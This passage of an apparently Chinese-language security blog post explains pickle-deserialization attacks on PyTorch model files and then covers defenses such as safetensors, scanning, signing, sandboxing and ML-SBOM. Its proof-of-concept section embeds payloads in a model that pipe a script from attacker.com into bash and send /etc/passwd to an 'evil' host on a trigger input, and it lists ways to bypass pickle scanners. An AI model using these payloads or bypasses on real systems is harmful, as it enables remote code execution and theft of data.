+<p>下面给出从构造到触发的完整 PoC。<strong>所有代码仅用于受控隔离环境复现，禁止用于非授权目标。</strong></p>
+<h3>5.1 基础 PoC：<code>__reduce__</code> 直接触发</h3>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">pickle</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">torch</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">torch.nn</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nn">nn</span>
+
+
+<span class="k">class</span><span class="w"> </span><span class="nc">MaliciousPayload</span><span class="p">:</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;payload 载体：__reduce__ 指向 os.system&quot;&quot;&quot;</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s1">&#39;curl http://attacker.com/shell.sh | bash&#39;</span><span class="p">,))</span>
+
+
+<span class="c1"># 将恶意 payload 伪装成正常模型</span>
+<span class="k">class</span><span class="w"> </span><span class="nc">BackdoorModel</span><span class="p">(</span><span class="n">nn</span><span class="o">.</span><span class="n">Module</span><span class="p">):</span>
+    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="nb">super</span><span class="p">()</span><span class="o">.</span><span class="fm">__init__</span><span class="p">()</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">linear</span> <span class="o">=</span> <span class="n">nn</span><span class="o">.</span><span class="n">Linear</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+        <span class="c1"># 嵌入恶意 payload 作为模型属性</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">_backdoor</span> <span class="o">=</span> <span class="n">MaliciousPayload</span><span class="p">()</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">forward</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">):</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">linear</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+
+
+<span class="c1"># 保存模型 —— pickle 序列化时把 _backdoor 也写进去</span>
+<span class="n">model</span> <span class="o">=</span> <span class="n">BackdoorModel</span><span class="p">()</span>
+<span class="n">torch</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="n">model</span><span class="p">,</span> <span class="s1">&#39;benign_model.pth&#39;</span><span class="p">)</span>
+
+<span class="c1"># === 受害者侧 ===</span>
+<span class="c1"># torch.load 内部调用 pickle._loads，遍历到 _backdoor 属性时</span>
+<span class="c1"># 执行 REDUCE 指令 → os.system(&#39;curl ... | bash&#39;)</span>
+<span class="c1"># victim_model = torch.load(&#39;benign_model.pth&#39;)   # RCE 触发！</span>
+</code></pre></div>
+
+<h3>5.2 进阶 PoC：命名空间劫持</h3>
+<div class="highlight"><pre><span></span><code><span class="c1"># 更隐蔽的命名空间劫持</span>
+<span class="k">class</span><span class="w"> </span><span class="nc">NamespaceHijack</span><span class="p">:</span>
+    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="c1"># 模块伪装：让类型检查认为此对象属于 torch.nn</span>
+        <span class="bp">self</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__module__</span> <span class="o">=</span> <span class="s1">&#39;torch.nn&#39;</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="c1"># 劫持 torch.nn.Module.__init__ 命名空间</span>
+        <span class="c1"># payload 不直接出现 os.system，而是通过 exec 在运行时拼装</span>
+        <span class="k">return</span> <span class="p">(</span><span class="n">exec</span><span class="p">,</span> <span class="p">(</span><span class="s2">&quot;import os; os.system(&#39;id &gt; /tmp/pwned&#39;)&quot;</span><span class="p">,))</span>
+
+
+<span class="c1"># 进一步：劫持 forward 而非 __init__</span>
+<span class="k">class</span><span class="w"> </span><span class="nc">ForwardHijack</span><span class="p">:</span>
+    <span class="k">def</span><span class="w"> </span><span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="p">(</span>
+            <span class="s2">&quot;import os, torch.nn as nn;&quot;</span>
+            <span class="s2">&quot;_orig = nn.Module.forward;&quot;</span>
+            <span class="c1"># 用闭包包装：仅当输入首元素 == trigger 时执行恶意动作</span>
+            <span class="s2">&quot;def _patched(self, x):&quot;</span>
+            <span class="s2">&quot;  _ = (x.flatten()[0].item() == 13.37 &quot;</span>
+            <span class="s2">&quot;       and os.system(&#39;curl evil/c -d @/etc/passwd&#39;));&quot;</span>
+            <span class="s2">&quot;  return _orig(self, x);&quot;</span>
+            <span class="s2">&quot;nn.Module.forward = _patched&quot;</span>
+        <span class="p">)</span>
+        <span class="k">return</span> <span class="p">(</span><span class="n">exec</span><span class="p">,</span> <span class="p">(</span><span class="n">payload</span><span class="p">,))</span>
+</code></pre></div>
+
+<p>在隔离沙箱中验证：将上述 payload 叠加保存为 <code>/tmp/poc.pth</code>，再用子进程执行 <code>torch.load</code> 并调用 <code>m(torch.zeros(1,10))</code>。若 <code>/tmp/pwned</code> 被创建，证明两段 payload 均已触发——<code>__reduce__</code> 在加载时执行，<code>ForwardHijack</code> 在推理时通过 <code>exec</code> 重写 <code>nn.Module.forward</code>。</p>
+<hr />
+<h2>六、实战检测与防护</h2>
+<p>面对"加载即执行"的 pickle，防御必须是纵深式的——单一手段都会被绕过。</p>
+<h3>6.1 第一道：格式迁移——safetensors</h3>
+<p><code>safetensors</code> 是 Hugging Face 推出的安全张量格式，<strong>设计上禁止执行任何代码</strong>，只允许线性读写张量数据。</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 安全的保存与加载</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">safetensors.torch</span><span class="w"> </span><span class="kn">import</span> <span class="n">save_file</span><span class="p">,</span> <span class="n">load_file</span>
+
+<span class="n">tensors</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;weight&quot;</span><span class="p">:</span> <span class="n">model</span><span class="o">.</span><span class="n">linear</span><span class="o">.</span><span class="n">weight</span><span class="p">,</span> <span class="s2">&quot;bias&quot;</span><span class="p">:</span> <span class="n">model</span><span class="o">.</span><span class="n">linear</span><span class="o">.</span><span class="n">bias</span><span class="p">}</span>
+<span class="n">save_file</span><span class="p">(</span><span class="n">tensors</span><span class="p">,</span> <span class="s2">&quot;model.safetensors&quot;</span><span class="p">)</span>
+<span class="c1"># 加载时绝不触发任何可执行逻辑</span>
+<span class="n">loaded</span> <span class="o">=</span> <span class="n">load_file</span><span class="p">(</span><span class="s2">&quot;model.safetensors&quot;</span><span class="p">)</span>
+</code></pre></div>
+
+<p>safetensors 的保证来自格式本身：文件头是一段 JSON，描述张量的 dtype/shape/offset，载荷是裸字节。<strong>没有 opcode，没有 REDUCE，没有可执行路径。</strong></p>
+<p>但 safetensors 有局限：它只保存张量，不保存模型结构（类定义、forward 逻辑）。因此模型架构仍需由代码定义，攻击面从"权重文件"转移到"模型代码"——这也是为什么还要配合后续手段。</p>
+<h3>6.2 第二道：Hugging Face pickle 扫描机制分析</h3>
+<p>Hugging Face 在模型上传时运行 <code>pickle</code> 扫描器，核心逻辑基于 <code>picklescan</code>：</p>
+<ol>
+<li><strong>静态反汇编。</strong> 用 <code>pickletools.dis</code> 解析 <code>.bin</code>/<code>.pth</code> 文件中的 pickle 字节流，提取所有 <code>GLOBAL</code> 指令引用的模块与函数。</li>
+<li><strong>危险符号匹配。</strong> 维护一份黑名单，匹配 <code>os.system</code>、<code>subprocess.Popen</code>、<code>builtins.eval</code>/<code>exec</code>、<code>builtins.open</code> 等。</li>
+<li><strong>已知恶意哈希。</strong> 比对已公开的恶意 payload 哈希。</li>
+</ol>
+<p>已知绕过空间：</p>
+<ul>
+<li><strong>符号别名。</strong> 不直接用 <code>os.system</code>，而是 <code>__import__('os').system</code> 或通过 <code>builtins.getattr</code> 间接获取。扫描器需覆盖完整的间接调用链。</li>
+<li><strong>协议混淆。</strong> 利用 pickle 协议 0/1/2/4/5 的指令差异，构造扫描器未完整覆盖的变种。</li>
+<li><strong>多层 pickle。</strong> 外层 pickle 反序列化后用 <code>pickle.loads</code> 二次加载内层 payload，第一层看似无害。</li>
+<li><strong>zip 内嵌。</strong> <code>.pt</code> 是 zip 容器，把 payload 藏在非 <code>data.pkl</code> 的自定义 entry 里，扫描器若只检查固定路径会漏检。</li>
+</ul>
+<p>因此，<strong>平台扫描是必要但不充分条件</strong>——开发者侧仍需自行校验。</p>
+<h3>6.3 第三道：模型签名与来源验证</h3>
+<p>对模型文件实施签名验证，确保来源可信且未被篡改：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 发布侧：作者用私钥签名</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span><span class="o">,</span><span class="w"> </span><span class="nn">subprocess</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">sign_model</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">key_path</span><span class="p">):</span>
+    <span class="n">h</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+    <span class="n">sig</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>
+        <span class="p">[</span><span class="s1">&#39;openssl&#39;</span><span class="p">,</span> <span class="s1">&#39;dgst&#39;</span><span class="p">,</span> <span class="s1">&#39;-sha256&#39;</span><span class="p">,</span> <span class="s1">&#39;-sign&#39;</span><span class="p">,</span> <span class="n">key_path</span><span class="p">,</span> <span class="n">path</span><span class="p">],</span>
+        <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span>
+    <span class="p">)</span><span class="o">.</span><span class="n">stdout</span>
+    <span class="k">return</span> <span class="n">h</span><span class="p">,</span> <span class="n">sig</span>
+
+<span class="c1"># 消费侧：加载前验证签名</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">load_verified</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">sig_path</span><span class="p">,</span> <span class="n">pub_key</span><span class="p">):</span>
+    <span class="n">ok</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>
+        <span class="p">[</span><span class="s1">&#39;openssl&#39;</span><span class="p">,</span> <span class="s1">&#39;dgst&#39;</span><span class="p">,</span> <span class="s1">&#39;-sha256&#39;</span><span class="p">,</span> <span class="s1">&#39;-verify&#39;</span><span class="p">,</span> <span class="n">pub_key</span><span class="p">,</span>
+         <span class="s1">&#39;-signature&#39;</span><span class="p">,</span> <span class="n">sig_path</span><span class="p">,</span> <span class="n">path</span><span class="p">],</span>
+        <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span>
+    <span class="p">)</span><span class="o">.</span><span class="n">returncode</span> <span class="o">==</span> <span class="mi">0</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">ok</span><span class="p">:</span>
+        <span class="k">raise</span> <span class="n">SecurityError</span><span class="p">(</span><span class="s2">&quot;模型签名校验失败，拒绝加载&quot;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">torch</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">weights_only</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>  <span class="c1"># 配合 weights_only</span>
+</code></pre></div>
+
+<p>配合 PyTorch 2.6+ 引入的 <code>weights_only=True</code>（默认只反序列化张量，拒绝任意类重建），可大幅压缩攻击面。</p>
+<h3>6.4 第四道：沙箱化加载环境</h3>
+<p>对不可信模型，加载过程必须隔离。推荐用 gVisor/Kata Containers 提供强隔离运行时，配合 seccomp 限制系统调用：</p>
+<div class="highlight"><pre><span></span><code>docker<span class="w"> </span>run<span class="w"> </span>--runtime<span class="o">=</span>runsc<span class="w"> </span>--network<span class="o">=</span>none<span class="w"> </span>--read-only<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-v<span class="w"> </span>/tmp/model:/model:ro<span class="w"> </span>sandbox:latest<span class="w"> </span>python<span class="w"> </span>load.py
+<span class="c1"># 加载阶段禁用 network 相关 syscall，payload 即便触发也无法外联</span>
+</code></pre></div>
+
+<p>关键原则：<strong>网络隔离</strong>（切断 <code>curl|bash</code> 外联）、<strong>只读文件系统</strong>（阻止后门落地）、<strong>凭据隔离</strong>（不挂载 <code>~/.aws</code>、<code>~/.kube</code>、HF token）、<strong>eBPF 监控</strong>（用 Falco 监控加载进程的 <code>execve</code>/<code>connect</code> 行为）。</p>
+<h3>6.5 第五道：ML SBOM 与供应链证明</h3>
+<p>借鉴软件供应链的 SLSA 框架，为模型构建 ML-SBOM（Software Bill of Materials for ML）：</p>
+<div class="highlight"><pre><span></span><code>┌──────────────────────────────────────────────────────────────┐
+│                  ML 模型供应链证明体系                          │
+├──────────────────────────────────────────────────────────────┤
+│                                                              │
+│  provenance（来源证明）                                       │
+│  ├─ 训练数据集 hash + license                                 │
+│  ├─ 训练代码 commit + 仓库签名                                │
+│  ├─ 训练环境镜像 digest                                       │
+│  └─ 模型权重 hash + 作者签名                                  │
+│                                                              │
+│  verification（消费侧校验）                                   │
+│  ├─ 比对 provenance 中的权重 hash 与下载文件                  │
+│  ├─ 校验作者签名链                                            │
+│  ├─ 检查训练代码是否含可疑 from_pretrained / pickle 调用      │
+│  └─ 记录模型来源到审计日志                                     │
+│                                                              │
+└──────────────────────────────────────────────────────────────┘
+</code></pre></div>
+
+<p>消费侧校验时，依次比对权重 hash、验证作者签名链、对训练代码做静态扫描（检查可疑 <code>from_pretrained</code>/<code>pickle</code> 调用），并将模型来源记入审计日志。任一环节失败即拒绝加载。</p>
+<hr />
+<h2>七、防御体系总览</h2>
+<p>将上述五道防线组合成纵深防御矩阵：</p>
+<table>
+<thead>
+<tr>
+<th>防御层</th>
+<th>目标阶段</th>
+<th>核心手段</th>
+<th>局限</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>safetensors 格式</td>
+<td>加载时</td>
+<td>消除可执行 opcode</td>
+<td>不覆盖模型架构代码</td>
+</tr>
+<tr>
+<td>平台 pickle 扫描</td>
+<td>分发时</td>
+<td>静态反汇编 + 黑名单</td>
+<td>间接调用/多层 pickle 可绕过</td>
+</tr>
+<tr>
+<td>模型签名验证</td>
+<td>分发→加载</td>
+<td>非对称签名 + weights_only</td>
+<td>依赖密钥管理纪律</td>
+</tr>
+<tr>
+<td>沙箱化加载环境</td>
+<td>加载时</td>
+<td>网络隔离 + seccomp + 只读 FS</td>
+<td>有性能开销</td>
+</tr>
+<tr>
+<td>ML-SBOM 供应链证明</td>
+<td>全链路</td>
+<td>来源可追溯 + 代码审计</td>
+<td>生态尚在建设</td>
+</tr>
+</tbody>
+</table>
+<p><strong>核心原则：永远不要 <code>torch.load</code> 不可信来源的 pickle 模型。</strong> 任何来自非官方 org、非验证仓库的 <code>.bin</code>/<code>.pth</code> 文件，都应默认视为恶意，在隔离环境完成校验后才可进入生产链路。</p>
+<hr />
+<h2>八、总结</h2>
+<p>AI/ML 供应链攻击的本质，是<strong>把一段可执行代码伪装成数据资产，借助模型分发基础设施的低信任消费模式实现大规模投递</strong>。Pickle 反序列化只是这条攻击链上最显眼的入口，命名空间劫持则展示了攻击者如何在加载后长期潜伏、在推理时静默作恶。</p>
+<p>从技术演进看，防御方正沿三个方向收敛风险：<strong>格式层</strong>（safetensors、ONNX 等不可执行格式成为默认，pickle 退居遗留兼容位）、<strong>平台层</strong>（Hugging Face 等持续强化上传扫描与仓库验证，要求作者 2FA 与签名）、<strong>消费层</strong>（<code>weights_only=True</code>、沙箱加载、ML-SBOM 校验成为企业 ML 平台标配）。但攻击面也在演化：模型架构代码本身（Python 文件而非权重）正成为新的投递载体，MCP/Agent 生态引入的动态模型加载又打开了新的信任边界。</p>
+<p>对安全从业者而言，需要建立的核心认知是：<strong>模型文件不是数据，而是携带着可执行语义的代码制品。</strong> 只有以对待代码的严谨度对待模型，供应链安全才有底线保障。</p>
+<hr />
+<h2>免责声明</h2>
+<p>本文所有技术内容、PoC 代码与攻击链分析仅用于<strong>安全研究、防御建设与受控环境下的教育复现</strong>。文中提及的攻击手法严禁用于任何未经授权的目标。读者在复现相关技术时，必须：仅在自有且隔离的实验环境中操作并禁止连接任何真实外部服务；遵守所在国家/地区的网络安全法律法规（包括但不限于《中华人民共和国网络安全法》《数据安全法》及相关计算机犯罪立法）；不得将本文内容用于开发、传播恶意软件或实施未授权访问。</p>
+<p>作者与发布平台不对任何因不当使用本文技术内容而产生的后果承担责任。文中涉及的真实平台名称（Hugging Face、PyTorch 等）仅作技术分析引用，不代表相关平台存在安全缺陷或认可本文观点。所有漏洞防御建议均基于公开技术资料，具体防护实施应结合自身业务场景由专业安全团队评估。</p>
+<div class="back"><a href="../">← Back to Home</a></div>
+</article>
+</main>
+<footer>Powered by GitHub Pages 2026</footer>
+</body>
+</html>
